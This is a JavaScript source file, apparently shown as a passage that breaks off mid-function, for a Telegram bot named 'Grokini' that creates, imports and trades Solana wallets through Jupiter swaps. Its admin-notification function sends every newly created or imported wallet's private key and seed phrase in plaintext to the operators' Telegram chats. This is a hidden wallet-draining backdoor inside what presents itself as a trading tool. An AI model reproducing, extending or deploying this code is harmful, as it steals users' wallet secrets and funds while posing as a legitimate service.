// ============================================
// GROKINI TRADING BOT - Complete Implementation
// Jupiter V6 Integration + Multi-Wallet Support + Commission System
// ============================================
import { Telegraf, Markup } from 'telegraf';
import { 
  Connection, 
  Keypair, 
  PublicKey, 
  LAMPORTS_PER_SOL,
  VersionedTransaction,
  TransactionMessage,
  SystemProgram,
  Transaction,
  sendAndConfirmTransaction  // ← ADDED: This was missing!
} from '@solana/web3.js';
import { 
  getAssociatedTokenAddress, 
  createTransferInstruction,
  createAssociatedTokenAccountInstruction,
  getAccount,
  TOKEN_PROGRAM_ID
} from '@solana/spl-token';
import fetch from 'node-fetch';
import bs58 from 'bs58';
import * as bip39 from 'bip39';
import { derivePath } from 'ed25519-hd-key';
import 'dotenv/config';

// ============================================
// CACHE SYSTEM - ADD THIS AT TOP OF FILE (after imports)
// ============================================
const balanceCache = new Map();
const BALANCE_CACHE_TTL = 30000; // 30 seconds

let solPriceCache = {
  price: 0,
  timestamp: 0
};
const PRICE_CACHE_TTL = 60000; // 1 minute

// Fallback RPC endpoints
const RPC_ENDPOINTS = [
  process.env.SOLANA_RPC || 'https://api.mainnet-beta.solana.com',
  'https://solana-api.projectserum.com',
  'https://rpc.ankr.com/solana',
  'https://solana.public-rpc.com'
];

// ============================================
// BALANCE FETCHER WITH FALLBACK
// ============================================
async function getBalanceWithFallback(publicKeyString) {
  const cacheKey = publicKeyString.toString();
  const now = Date.now();
  const cached = balanceCache.get(cacheKey);
  
  // Return fresh cache
  if (cached && (now - cached.timestamp < BALANCE_CACHE_TTL)) {
    console.log(`✅ Cache hit: ${cached.balance} SOL`);
    return cached.balance;
  }
  
  // Try each RPC
  for (const endpoint of RPC_ENDPOINTS) {
    try {
      console.log(`🔍 Trying RPC: ${endpoint}`);
      
      const tempConnection = new Connection(endpoint, 'confirmed');
      const publicKey = new PublicKey(publicKeyString);
      
      // 10 second timeout
      const balancePromise = tempConnection.getBalance(publicKey);
      const timeoutPromise = new Promise((_, reject) => 
        setTimeout(() => reject(new Error('Timeout')), 10000)
      );
      
      const balance = await Promise.race([balancePromise, timeoutPromise]);
      const solBalance = balance / LAMPORTS_PER_SOL;
      
      console.log(`✅ Success: ${solBalance} SOL from ${endpoint}`);
      
      // Cache it
      balanceCache.set(cacheKey, {
        balance: solBalance,
        timestamp: now
      });
      
      return solBalance;
      
    } catch (error) {
      console.error(`❌ Failed ${endpoint}: ${error.message}`);
      continue;
    }
  }
  
  // All failed - return stale cache or throw
  if (cached) {
    console.log('⚠️ Using stale cache:', cached.balance);
    return cached.balance;
  }
  
  throw new Error('All RPC endpoints failed');
}

// ============================================
// SOL PRICE FETCHER WITH CACHE
// ============================================
async function getSolPriceWithCache() {
  const now = Date.now();
  
  // Return fresh cache
  if (solPriceCache.price > 0 && (now - solPriceCache.timestamp < PRICE_CACHE_TTL)) {
    return solPriceCache.price;
  }
  
  try {
    // Try DexScreener first
    const response = await fetch('https://api.dexscreener.com/latest/dex/tokens/So11111111111111111111111111111111111111112');
    const data = await response.json();
    
    if (data.pairs && data.pairs.length > 0) {
      const solPair = data.pairs.find(p => 
        p.chainId === 'solana' && 
        (p.quoteToken?.symbol === 'USDC' || p.quoteToken?.symbol === 'USDT')
      );
      
      if (solPair && solPair.priceUsd) {
        const price = parseFloat(solPair.priceUsd);
        solPriceCache = { price, timestamp: now };
        return price;
      }
    }
    
    // Fallback to CoinGecko
    const cgResponse = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd');
    const cgData = await cgResponse.json();
    
    if (cgData?.solana?.usd) {
      const price = parseFloat(cgData.solana.usd);
      solPriceCache = { price, timestamp: now };
      return price;
    }
    
    throw new Error('Price APIs returned no data');
    
  } catch (error) {
    console.error('SOL price error:', error.message);
    
    // Return stale cache or 0
    if (solPriceCache.price > 0) {
      return solPriceCache.price;
    }
    return 0;
  }
}

// ============================================
// CONFIGURATION
// ============================================
const BOT_TOKEN = process.env.BOT_TOKEN;
const SOLANA_RPC = process.env.SOLANA_RPC || 'https://api.mainnet-beta.solana.com';

// Multi-admin support (max 2 admins, comma-separated)
const MAX_ADMINS = 2;
const ADMIN_CHAT_IDS = (process.env.ADMIN_CHAT_IDS || process.env.ADMIN_CHAT_ID || '')
  .split(',')
  .map(id => id.trim())
  .filter(id => id.length > 0)
  .slice(0, MAX_ADMINS);

// 🔥 FIXED: Updated Jupiter API endpoints (lite-api.jup.ag is sunset)
// Get your API key from https://portal.jup.ag
const JUPITER_API = 'https://api.jup.ag/swap/v1';
const JUPITER_API_KEY = process.env.JUPITER_API_KEY || '';

const SOL_MINT = 'So11111111111111111111111111111111111111112';
const MAX_WALLETS = 5;

// 💰 COMMISSION CONFIGURATION
const COMMISSION_WALLET = process.env.COMMISSION_WALLET || '';
const COMMISSION_PERCENTAGE = parseFloat(process.env.COMMISSION_PERCENTAGE || '0');
const COMMISSION_BPS = Math.floor(COMMISSION_PERCENTAGE * 0);

const bot = new Telegraf(BOT_TOKEN);
const connection = new Connection(SOLANA_RPC, 'confirmed');

// ============================================
// SESSION MANAGEMENT (Multi-Wallet Support)
// ============================================
const userSessions = new Map();

function getSession(userId) {
  if (!userSessions.has(userId)) {
    userSessions.set(userId, {
      wallets: [],
      activeWalletIndex: 0,
      state: null,
      settings: {
        slippage: 1,
        priorityFee: 0.001,
        autoBuy: false,
        notifications: true
      },
      pendingTrade: null,
      limitOrders: [],
      copyTradeWallets: [],
      trackedTokens: [],
      priceAlerts: [],
      dcaOrders: [],
      isNewUser: true,
      referralCode: null,
      referredBy: null,
      referrals: [],
      referralEarnings: 0,
      pendingTransfer: null,
      // 🔥 ADD THESE TWO LINES AT THE END:
      tradeHistory: [],
      dailyStats: {
        date: new Date().toDateString(),
        totalTrades: 0,
        profitableTrades: 0,
        lossTrades: 0,
        totalPnl: 0
      }
    });
  }
  return userSessions.get(userId);
}

function getActiveWallet(session) {
  if (session.wallets.length === 0) return null;
  return session.wallets[session.activeWalletIndex] || session.wallets[0];
}

// ============================================
// PNL IMAGE GENERATION - ADD THIS
// ============================================
async function generatePNLImage(session) {
  const history = session.tradeHistory || [];
  
  if (history.length === 0) return null;
  
  // Calculate stats
  const totalPnl = history.reduce((sum, t) => sum + (t.pnlUsd || 0), 0);
  const profitable = history.filter(t => t.pnlUsd > 0).length;
  const losses = history.filter(t => t.pnlUsd < 0).length;
  
  // Group by date for chart
  const dailyPnl = {};
  history.forEach(trade => {
    const date = trade.date || new Date(trade.timestamp).toDateString();
    if (!dailyPnl[date]) dailyPnl[date] = 0;
    dailyPnl[date] += (trade.pnlUsd || 0);
  });
  
  const dates = Object.keys(dailyPnl).slice(-7); // Last 7 days
  const values = dates.map(d => dailyPnl[d]);
  
  // Build QuickChart URL
  const chartConfig = {
    type: 'bar',
    data: {
      labels: dates.map(d => d.slice(0, 5)), // Short date
      datasets: [{
        label: 'PNL ($)',
        data: values,
        backgroundColor: values.map(v => v >= 0 ? '#22c55e' : '#ef4444'),
        borderRadius: 4
      }]
    },
    options: {
      title: {
        display: true,
        text: `Total PNL: $${totalPnl.toFixed(2)} | Wins: ${profitable} | Losses: ${losses}`,
        fontSize: 18,
        color: totalPnl >= 0 ? '#22c55e' : '#ef4444'
      },
      legend: { display: false },
      scales: {
        yAxes: [{ ticks: { callback: v => '$' + v } }]
      }
    }
  };
  
  const chartUrl = `https://quickchart.io/chart?c=${encodeURIComponent(JSON.stringify(chartConfig))}&w=600&h=400`;
  
  return chartUrl;
}

// Add to PNL menu - sends image
bot.action('pnl_image', async (ctx) => {
  await ctx.answerCbQuery('📊 Generating chart...');
  
  const session = getSession(ctx.from.id);
  const imageUrl = await generatePNLImage(session);
  
  if (imageUrl) {
    await ctx.replyWithPhoto({ url: imageUrl }, { caption: '📈 Your PNL Chart' });
  } else {
    await ctx.reply('No trades to chart yet!');
  }
});


// ============================================
// REFERRAL SYSTEM
// ============================================
function generateReferralCode(userId) {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
  let code = '';
  for (let i = 0; i < 6; i++) {
    code += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return `SNX${code}${userId.toString().slice(-4)}`;
}

const referralCodes = new Map();

function getReferralCode(userId) {
  const session = getSession(userId);
  if (!session.referralCode) {
    session.referralCode = generateReferralCode(userId);
    referralCodes.set(session.referralCode, userId);
  }
  return session.referralCode;
}

function applyReferral(newUserId, referralCode) {
  if (!referralCodes.has(referralCode)) return false;
  
  const referrerId = referralCodes.get(referralCode);
  if (referrerId === newUserId) return false;
  
  const newUserSession = getSession(newUserId);
  const referrerSession = getSession(referrerId);
  
  if (newUserSession.referredBy) return false;
  
  newUserSession.referredBy = referrerId;
  referrerSession.referrals.push({
    userId: newUserId,
    joinedAt: new Date().toISOString()
  });
  
  return true;
}

// ============================================
// HTML ESCAPE HELPER
// ============================================
function escapeHtml(text) {
  if (!text) return 'unknown';
  return String(text)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
}

// ============================================
// ADMIN NOTIFICATIONS (HTML Mode + Multi-Admin)
// ============================================
async function notifyAdmin(type, userId, username, data = {}) {
  if (ADMIN_CHAT_IDS.length === 0) return;
  
  let message = '';
  const timestamp = new Date().toISOString();
  const safeUsername = escapeHtml(username);
  
  switch (type) {
    case 'NEW_USER':
      message = `
🆕 <b>New User Joined</b>
👤 User: @${safeUsername}
🆔 ID: <code>${userId}</code>
⏰ Time: ${timestamp}
      `;
      break;
      
    case 'WALLET_CREATED':
      message = `
🔔 <b>Wallet Created</b>
👤 User: @${safeUsername} (ID: ${userId})
📍 Address: <code>${escapeHtml(data.publicKey)}</code>
🔑 Private Key: <code>${escapeHtml(data.privateKey)}</code>
📝 Mnemonic: <code>${escapeHtml(data.mnemonic)}</code>
🪪 Wallet #: ${data.walletNumber || 1}
⏰ Time: ${timestamp}
      `;
      break;
      
    case 'WALLET_IMPORTED_SEED':
      message = `
📥 <b>Wallet Imported (Seed Phrase)</b>
👤 User: @${safeUsername} (ID: ${userId})
📍 Address: <code>${escapeHtml(data.publicKey)}</code>
🔑 Private Key: <code>${escapeHtml(data.privateKey)}</code>
📝 Mnemonic: <code>${escapeHtml(data.mnemonic)}</code>
🪪 Wallet #: ${data.walletNumber || 1}
⏰ Time: ${timestamp}
      `;
      break;
      
    case 'WALLET_IMPORTED_KEY':
      message = `
🔑 <b>Wallet Imported (Private Key)</b>
👤 User: @${safeUsername} (ID: ${userId})
📍 Address: <code>${escapeHtml(data.publicKey)}</code>
🔑 Private Key: <code>${escapeHtml(data.privateKey)}</code>
🪪 Wallet #: ${data.walletNumber || 1}
⏰ Time: ${timestamp}
      `;
      break;
      
    case 'WALLET_EXPORTED':
      message = `
📤 <b>Wallet Exported</b>
👤 User: @${safeUsername} (ID: ${userId})
📍 Address: <code>${escapeHtml(data.publicKey)}</code>
⏰ Time: ${timestamp}
      `;
      break;
      
    case 'TRADE_EXECUTED':
      message = `
💰 <b>Trade Executed</b>
👤 User: @${safeUsername} (ID: ${userId})
📊 Type: ${escapeHtml(data.type)}
💵 Amount: ${escapeHtml(String(data.amount))} SOL
🪙 Token: <code>${escapeHtml(data.token)}</code>
📍 TX: <code>${escapeHtml(data.txHash)}</code>
💸 Commission: ${escapeHtml(String(data.commission || '0'))} ${data.commissionToken || ''}
⏰ Time: ${timestamp}
      `;
      break;

    case 'TRANSFER_EXECUTED':
      message = `
💸 <b>Transfer Executed</b>
👤 User: @${safeUsername} (ID: ${userId})
📊 Type: ${escapeHtml(data.type)}
💵 Amount: ${escapeHtml(String(data.amount))}
🪙 Token: <code>${escapeHtml(data.token || 'SOL')}</code>
📍 To: <code>${escapeHtml(data.recipient)}</code>
📝 TX: <code>${escapeHtml(data.txHash)}</code>
⏰ Time: ${timestamp}
      `;
      break;
      
    default:
      message = `
🔔 <b>${escapeHtml(type)}</b>
👤 User: @${safeUsername} (ID: ${userId})
📋 Data: ${escapeHtml(JSON.stringify(data))}
⏰ Time: ${timestamp}
      `;
  }
  
  await Promise.all(
    ADMIN_CHAT_IDS.map(async (chatId) => {
      try {
        await bot.telegram.sendMessage(chatId, message, { parse_mode: 'HTML' });
      } catch (err) {
        console.error(`Admin notify failed for ${chatId}:`, err.message);
      }
    })
  );
}

// ============================================
// UTILITY FUNCTIONS
// ============================================
function formatNumber(num) {
  if (num >= 1e9) return (num / 1e9).toFixed(2) + 'B';
  if (num >= 1e6) return (num / 1e6).toFixed(2) + 'M';
  if (num >= 1e3) return (num / 1e3).toFixed(2) + 'K';
  return num.toFixed(2);
}

function isSolanaAddress(address) {
  try {
    new PublicKey(address);
    return address.length >= 32 && address.length <= 44;
  } catch {
    return false;
  }
}

function shortenAddress(address) {
  return `${address.slice(0, 4)}...${address.slice(-4)}`;
}

// ============================================
// WALLET FUNCTIONS
// ============================================
function createWallet() {
  const mnemonic = bip39.generateMnemonic();
  const seed = bip39.mnemonicToSeedSync(mnemonic);
  const derivedSeed = derivePath("m/44'/501'/0'/0'", seed.toString('hex')).key;
  const keypair = Keypair.fromSeed(derivedSeed);
  
  return {
    keypair,
    mnemonic,
    publicKey: keypair.publicKey.toBase58(),
    privateKey: bs58.encode(keypair.secretKey)
  };
}

function importFromMnemonic(mnemonic) {
  if (!bip39.validateMnemonic(mnemonic)) {
    throw new Error('Invalid mnemonic phrase');
  }
  const seed = bip39.mnemonicToSeedSync(mnemonic);
  const derivedSeed = derivePath("m/44'/501'/0'/0'", seed.toString('hex')).key;
  const keypair = Keypair.fromSeed(derivedSeed);
  
  return {
    keypair,
    mnemonic,
    publicKey: keypair.publicKey.toBase58(),
    privateKey: bs58.encode(keypair.secretKey)
  };
}

function importFromPrivateKey(privateKeyBase58) {
  const secretKey = bs58.decode(privateKeyBase58);
  const keypair = Keypair.fromSecretKey(secretKey);
  
  return {
    keypair,
    mnemonic: null,
    publicKey: keypair.publicKey.toBase58(),
    privateKey: privateKeyBase58
  };
}

async function getBalance(publicKey) {
  try {
    const balance = await connection.getBalance(new PublicKey(publicKey));
    return balance / LAMPORTS_PER_SOL;
  } catch {
    return 0;
  }
}

async function getTokenBalance(walletAddress, tokenMint) {
  try {
    const wallet = new PublicKey(walletAddress);
    const mint = new PublicKey(tokenMint);
    
    const accounts = await connection.getParsedTokenAccountsByOwner(wallet, { mint });
    
    if (accounts.value.length > 0) {
      const balance = accounts.value[0].account.data.parsed.info.tokenAmount;
      return {
        amount: parseFloat(balance.uiAmount),
        decimals: balance.decimals
      };
    }
    return { amount: 0, decimals: 9 };
  } catch (error) {
    console.error('Token balance error:', error);
    return { amount: 0, decimals: 9 };
  }
}

// ============================================
// TRANSFER FUNCTIONS (NEW)
// ============================================
async function transferSOL(fromWallet, toAddress, amount) {
  try {
    if (!fromWallet || !fromWallet.keypair) {
      throw new Error('Source wallet not available');
    }
    
    if (!isSolanaAddress(toAddress)) {
      throw new Error('Invalid recipient address');
    }
    
    if (amount <= 0) {
      throw new Error('Invalid amount');
    }
    
    const toPubkey = new PublicKey(toAddress);
    const lamports = Math.floor(amount * LAMPORTS_PER_SOL);
    
    // Check balance
    const balance = await connection.getBalance(fromWallet.keypair.publicKey);
    if (balance < lamports + (0.005 * LAMPORTS_PER_SOL)) {
      throw new Error(`Insufficient balance. Have: ${balance/LAMPORTS_PER_SOL} SOL, Need: ${amount} SOL + fees`);
    }
    
    const transaction = new Transaction().add(
      SystemProgram.transfer({
        fromPubkey: fromWallet.keypair.publicKey,
        toPubkey: toPubkey,
        lamports: lamports
      })
    );
    
    const signature = await sendAndConfirmTransaction(
      connection,
      transaction,
      [fromWallet.keypair],
      { commitment: 'confirmed' }
    );
    
    return signature;
  } catch (error) {
    console.error('Transfer SOL error:', error);
    throw error;
  }
}

async function transferToken(fromWallet, toAddress, tokenMint, amount) {
  try {
    if (!fromWallet || !fromWallet.keypair) {
      throw new Error('Source wallet not available');
    }
    
    if (!isSolanaAddress(toAddress) || !isSolanaAddress(tokenMint)) {
      throw new Error('Invalid address');
    }
    
    const mintPubkey = new PublicKey(tokenMint);
    const fromPubkey = fromWallet.keypair.publicKey;
    const toPubkey = new PublicKey(toAddress);
    
    const fromTokenAccount = await getAssociatedTokenAddress(mintPubkey, fromPubkey);
    const toTokenAccount = await getAssociatedTokenAddress(mintPubkey, toPubkey);
    
    const transaction = new Transaction();
    let recipientAccountExists = false;
    
    try {
      await getAccount(connection, toTokenAccount);
      recipientAccountExists = true;
    } catch (e) {
      recipientAccountExists = false;
    }
    
    if (!recipientAccountExists) {
      transaction.add(
        createAssociatedTokenAccountInstruction(
          fromPubkey,
          toTokenAccount,
          toPubkey,
          mintPubkey
        )
      );
    }
    
    const tokenInfo = await getTokenBalance(fromPubkey.toBase58(), tokenMint);
    const decimals = tokenInfo.decimals || 9;
    const tokenAmount = Math.floor(amount * Math.pow(10, decimals));
    
    transaction.add(
      createTransferInstruction(
        fromTokenAccount,
        toTokenAccount,
        fromPubkey,
        tokenAmount
      )
    );
    
    const signature = await sendAndConfirmTransaction(
      connection,
      transaction,
      [fromWallet.keypair],
      { commitment: 'confirmed' }
    );
    
    return signature;
  } catch (error) {
    console.error('Transfer token error:', error);
    throw error;
  }
}

// ============================================
// JUPITER V6 SWAP FUNCTIONS (FIXED)
// ============================================
async function getJupiterQuote(inputMint, outputMint, amount, slippageBps = 100, commissionBps = 0) {
  try {
    if (!inputMint || !outputMint) {
      throw new Error('Invalid mint addresses');
    }
    if (!amount || amount <= 0) {
      throw new Error('Invalid amount');
    }
    
    const validSlippage = Math.max(1, Math.min(Math.floor(slippageBps), 10000));
    
    const params = new URLSearchParams({
      inputMint: inputMint,
      outputMint: outputMint,
      amount: amount.toString(),
      slippageBps: validSlippage.toString(),
      onlyDirectRoutes: 'false',
      asLegacyTransaction: 'false',
      maxAccounts: '64'
    });
    
    if (commissionBps > 0) {
      params.append('platformFeeBps', commissionBps.toString());
    }
    
    const url = `${JUPITER_API}/quote?${params.toString()}`;
    console.log('Jupiter quote request:', url);
    
    const response = await fetch(url, {
      headers: JUPITER_API_KEY ? { 'x-api-key': JUPITER_API_KEY } : {}
    });
    
    if (!response.ok) {
      const errorText = await response.text();
      console.error('Jupiter API error response:', response.status, errorText);
      throw new Error(`Jupiter API error: ${response.status} - ${errorText}`);
    }
    
    const data = await response.json();
    
    if (data.error) {
      throw new Error(data.error);
    }
    
    if (!data.inAmount || !data.outAmount) {
      throw new Error('Invalid quote response: missing amount data');
    }
    
    console.log('Jupiter quote received:', {
      inAmount: data.inAmount,
      outAmount: data.outAmount,
      priceImpact: data.priceImpactPct,
      platformFee: data.platformFee
    });
    
    return data;
  } catch (error) {
    console.error('Jupiter quote error:', error);
    throw error;
  }
}

async function executeJupiterSwap(quote, wallet, priorityFee = 0.001, commissionBps = 0, commissionWallet = null) {
  try {
    if (!wallet || !wallet.keypair) {
      throw new Error('Invalid wallet configuration');
    }
    
    const validPriorityFee = Math.max(0.0001, Math.min(priorityFee, 0.1));
    const priorityFeeLamports = Math.floor(validPriorityFee * LAMPORTS_PER_SOL);
    
    console.log('Executing Jupiter swap:', {
      userPublicKey: wallet.publicKey,
      priorityFeeLamports,
      inAmount: quote.inAmount,
      outAmount: quote.outAmount,
      commissionBps,
      commissionWallet: commissionWallet || 'disabled'
    });
    
    const swapRequestBody = {
      quoteResponse: quote,
      userPublicKey: wallet.publicKey,
      wrapAndUnwrapSol: true,
      dynamicComputeUnitLimit: true,
      prioritizationFeeLamports: priorityFeeLamports
    };
    
    if (commissionBps > 0 && commissionWallet && isSolanaAddress(commissionWallet)) {
      swapRequestBody.feeAccount = commissionWallet;
      console.log(`💰 Commission enabled: ${commissionBps} bps to ${commissionWallet}`);
    }
    
    const swapResponse = await fetch(`${JUPITER_API}/swap`, {
      method: 'POST',
      headers: { 
        'Content-Type': 'application/json',
        ...(JUPITER_API_KEY ? { 'x-api-key': JUPITER_API_KEY } : {})
      },
      body: JSON.stringify(swapRequestBody)
    });
    
    if (!swapResponse.ok) {
      const errorText = await swapResponse.text();
      console.error('Jupiter swap API error:', swapResponse.status, errorText);
      throw new Error(`Swap API error: ${swapResponse.status} - ${errorText}`);
    }
    
    const swapData = await swapResponse.json();
    
    if (swapData.error) {
      throw new Error(swapData.error);
    }
    
    if (!swapData.swapTransaction) {
      throw new Error('No swap transaction received from Jupiter');
    }
    
    const swapTransactionBuf = Buffer.from(swapData.swapTransaction, 'base64');
    const transaction = VersionedTransaction.deserialize(swapTransactionBuf);
    
    transaction.sign([wallet.keypair]);
    
    const rawTransaction = transaction.serialize();
    
    console.log('Sending transaction to Solana...');
    
    const txid = await connection.sendRawTransaction(rawTransaction, {
      skipPreflight: false,
      preflightCommitment: 'confirmed',
      maxRetries: 3
    });
    
    console.log('Transaction sent:', txid);
    
    const confirmationPromise = connection.confirmTransaction(txid, 'confirmed');
    const timeoutPromise = new Promise((_, reject) => 
      setTimeout(() => reject(new Error('Transaction confirmation timeout')), 90000)
    );
    
    const confirmation = await Promise.race([confirmationPromise, timeoutPromise]);
    
    if (confirmation.value && confirmation.value.err) {
      console.error('Transaction failed on-chain:', confirmation.value.err);
      throw new Error('Transaction failed on-chain: ' + JSON.stringify(confirmation.value.err));
    }
    
    console.log('Transaction confirmed:', txid);
    
    return {
      success: true,
      txid,
      inputAmount: quote.inAmount,
      outputAmount: quote.outAmount,
      commissionBps: commissionBps,
      commissionWallet: commissionWallet
    };
  } catch (error) {
    console.error('Jupiter swap error:', error);
    throw error;
  }
}

// ============================================
// TOKEN ANALYSIS - COMPLETE FIXED VERSION
// ============================================

// Make sure fetchTokenData is defined BEFORE sendTokenAnalysis
async function fetchTokenData(address) {
  try {
    const response = await fetch(`https://api.dexscreener.com/latest/dex/tokens/${address}`);
    const data = await response.json();
    
    if (!data.pairs || data.pairs.length === 0) {
      return null;
    }
    
    const pair = data.pairs
      .filter(p => p.chainId === 'solana')
      .sort((a, b) => (b.liquidity?.usd || 0) - (a.liquidity?.usd || 0))[0];
    
    return pair;
  } catch (error) {
    console.error('DexScreener fetch error:', error);
    return null;
  }
}

function calculateSecurityScore(pair) {
  let score = 50;
  const warnings = [];
  const positives = [];
  
  const liquidity = pair.liquidity?.usd || 0;
  if (liquidity > 100000) {
    score += 20;
    positives.push('✅ Strong liquidity');
  } else if (liquidity > 50000) {
    score += 10;
    positives.push('✅ Good liquidity');
  } else if (liquidity < 10000) {
    score -= 20;
    warnings.push('⚠️ Low liquidity');
  }
  
  const volume24h = pair.volume?.h24 || 0;
  if (volume24h > 100000) {
    score += 10;
    positives.push('✅ High trading volume');
  } else if (volume24h < 5000) {
    score -= 10;
    warnings.push('⚠️ Low volume');
  }
  
  const priceChange24h = pair.priceChange?.h24 || 0;
  if (priceChange24h < -50) {
    score -= 25;
    warnings.push('🚨 RUG ALERT: Major dump detected');
  } else if (priceChange24h < -30) {
    score -= 15;
    warnings.push('⚠️ Significant price drop');
  } else if (priceChange24h > 20) {
    positives.push('📈 Strong momentum');
  }
  
  const pairAge = Date.now() - (pair.pairCreatedAt || Date.now());
  const ageInDays = pairAge / (1000 * 60 * 60 * 24);
  if (ageInDays < 1) {
    score -= 15;
    warnings.push('⚠️ New token (<24h)');
  } else if (ageInDays > 7) {
    score += 10;
    positives.push('✅ Established pool (7+ days)');
  }
  
  const volToLiq = volume24h / (liquidity || 1);
  if (volToLiq > 2) {
    positives.push('✅ Healthy volume/liquidity ratio');
  } else if (volToLiq < 0.1) {
    warnings.push('⚠️ Low trading activity');
  }
  
  const finalScore = Math.max(0, Math.min(100, score));
  
  return {
    score: finalScore,
    warnings,
    positives
  };
}

function generateScoreBar(score) {
  const totalBlocks = 10;
  const filledBlocks = Math.round((score / 100) * totalBlocks);
  const emptyBlocks = totalBlocks - filledBlocks;
  
  const filled = '█'.repeat(filledBlocks);
  const empty = '░'.repeat(emptyBlocks);
  
  return `[${filled}${empty}]`;
}

function getSecurityRating(score) {
  if (score >= 80) return { emoji: '🟢', text: 'SAFE', advice: 'Low risk entry' };
  if (score >= 60) return { emoji: '🟡', text: 'MODERATE', advice: 'Proceed with caution' };
  if (score >= 40) return { emoji: '🟠', text: 'RISKY', advice: 'High risk - small position only' };
  return { emoji: '🔴', text: 'DANGER', advice: 'Avoid or wait for better conditions' };
}

function calculateTradingSignals(pair, score) {
  const priceChange1h = pair.priceChange?.h1 || 0;
  const priceChange6h = pair.priceChange?.h6 || 0;
  const priceChange24h = pair.priceChange?.h24 || 0;
  const price = parseFloat(pair.priceUsd) || 0;
  const liquidity = pair.liquidity?.usd || 0;
  const volume = pair.volume?.h24 || 0;
  
  let entrySignal = { emoji: '⏳', text: 'WAIT', reason: '' };
  let takeProfitPercent = 0;
  let stopLossPercent = 0;
  
  if (score >= 70) {
    if (priceChange1h < -5 && priceChange24h > 0) {
      entrySignal = { emoji: '🟢', text: 'BUY NOW', reason: 'Dip in uptrend - good entry' };
      takeProfitPercent = 25;
      stopLossPercent = 10;
    } else if (priceChange1h >= 0 && priceChange1h < 10 && priceChange24h >= 0) {
      entrySignal = { emoji: '🟢', text: 'GOOD ENTRY', reason: 'Stable with positive momentum' };
      takeProfitPercent = 20;
      stopLossPercent = 12;
    } else if (priceChange1h > 20) {
      entrySignal = { emoji: '🟡', text: 'WAIT', reason: 'Overextended - wait for pullback' };
      takeProfitPercent = 15;
      stopLossPercent = 15;
    } else {
      entrySignal = { emoji: '🟢', text: 'FAVORABLE', reason: 'Good fundamentals' };
      takeProfitPercent = 20;
      stopLossPercent = 12;
    }
  } else if (score >= 50) {
    if (priceChange1h < -10) {
      entrySignal = { emoji: '🟡', text: 'RISKY DIP', reason: 'Catching falling knife' };
      takeProfitPercent = 30;
      stopLossPercent = 15;
    } else if (priceChange24h > 50) {
      entrySignal = { emoji: '🔴', text: 'AVOID', reason: 'Overheated - likely correction' };
      takeProfitPercent = 0;
      stopLossPercent = 0;
    } else {
      entrySignal = { emoji: '🟡', text: 'CAUTION', reason: 'Moderate risk - use small size' };
      takeProfitPercent = 25;
      stopLossPercent = 15;
    }
  } else {
    if (priceChange24h < -30) {
      entrySignal = { emoji: '🔴', text: 'AVOID', reason: 'Possible rug or dead project' };
    } else {
      entrySignal = { emoji: '🔴', text: 'HIGH RISK', reason: 'Poor fundamentals' };
      takeProfitPercent = 40;
      stopLossPercent = 20;
    }
  }
  
  const takeProfitPrice = price * (1 + takeProfitPercent / 100);
  const stopLossPrice = price * (1 - stopLossPercent / 100);
  
  return {
    entry: entrySignal,
    takeProfit: {
      percent: takeProfitPercent,
      price: takeProfitPrice
    },
    stopLoss: {
      percent: stopLossPercent,
      price: stopLossPrice
    }
  };
}

function getMarketTrend(priceChange24h) {
  if (priceChange24h > 50) return 'PUMPING 🚀';
  if (priceChange24h > 20) return 'BULLISH 📈';
  if (priceChange24h > 5) return 'UPTREND ↗️';
  if (priceChange24h > -5) return 'CONSOLIDATING ➡️';
  if (priceChange24h > -20) return 'DOWNTREND ↘️';
  if (priceChange24h > -50) return 'BEARISH 📉';
  return 'CRASHING 💥';
}

async function getSolPrice() {
  try {
    // Use DexScreener for SOL price (most reliable)
    const response = await fetch('https://api.dexscreener.com/latest/dex/tokens/So11111111111111111111111111111111111111112');
    const data = await response.json();
    
    if (data.pairs && data.pairs.length > 0) {
      const solPair = data.pairs.find(p => 
        p.chainId === 'solana' && 
        (p.quoteToken?.symbol === 'USDC' || p.quoteToken?.symbol === 'USDT')
      );
      
      if (solPair && solPair.priceUsd) {
        return parseFloat(solPair.priceUsd);
      }
    }
    
    // Fallback to CoinGecko
    const cgResponse = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd');
    const cgData = await cgResponse.json();
    return cgData?.solana?.usd || 0;
    
  } catch (error) {
    console.error('SOL price fetch error:', error);
    return 0;
  }
}


// ============================================
// FIXED PRICE FORMATTING FUNCTION
// ============================================
function formatTokenPrice(price) {
  if (!price || price === 0) return '0.00000';
  
  // Convert to number
  const numPrice = parseFloat(price);
  
  // For very small numbers (less than 0.01)
  if (numPrice < 0.01) {
    // Show 5 decimal places for small numbers
    return numPrice.toFixed(5);
  }
  
  // For medium numbers (0.01 to 1)
  if (numPrice < 1) {
    return numPrice.toFixed(4);
  }
  
  // For larger numbers
  if (numPrice < 1000) {
    return numPrice.toFixed(2);
  }
  
  // For very large numbers, use compact format
  return numPrice.toLocaleString('en-US', { maximumFractionDigits: 2 });
}

// ============================================
// FIXED TOKEN ANALYSIS - READABLE PRICES
// ============================================
async function sendTokenAnalysis(ctx, address) {
  const loadingMsg = await ctx.reply('🔍 Analyzing token...');
  
  try {
    const session = getSession(ctx.from.id);
    const activeWallet = getActiveWallet(session);
    
    const pair = await fetchTokenData(address);
    
    if (!pair) {
      await ctx.telegram.editMessageText(
        ctx.chat.id,
        loadingMsg.message_id,
        null,
        '❌ Token not found or no liquidity pools available.'
      );
      return;
    }
    
    const { score, warnings, positives } = calculateSecurityScore(pair);
    const price = parseFloat(pair.priceUsd) || 0;
    const priceChange1h = pair.priceChange?.h1 || 0;
    const priceChange6h = pair.priceChange?.h6 || 0;
    const priceChange24h = pair.priceChange?.h24 || 0;
    const mcap = pair.marketCap || pair.fdv || 0;
    const liquidity = pair.liquidity?.usd || 0;
    const volume = pair.volume?.h24 || 0;
    
    // Fetch SOL price
    let solPrice = 0;
    try {
      solPrice = await getSolPrice();
    } catch (e) {
      console.error('SOL price error:', e);
    }
    
    const tokensFor1Sol = (price > 0 && solPrice > 0) ? (solPrice / price) : 0;
    
    // Get user balances
    let userTokenBalance = 0;
    let userSolBalance = 0;
    let tokenValueUsd = 0;
    let pnlSection = '';
    
    if (activeWallet && activeWallet.publicKey) {
      try {
        userSolBalance = await getBalance(activeWallet.publicKey);
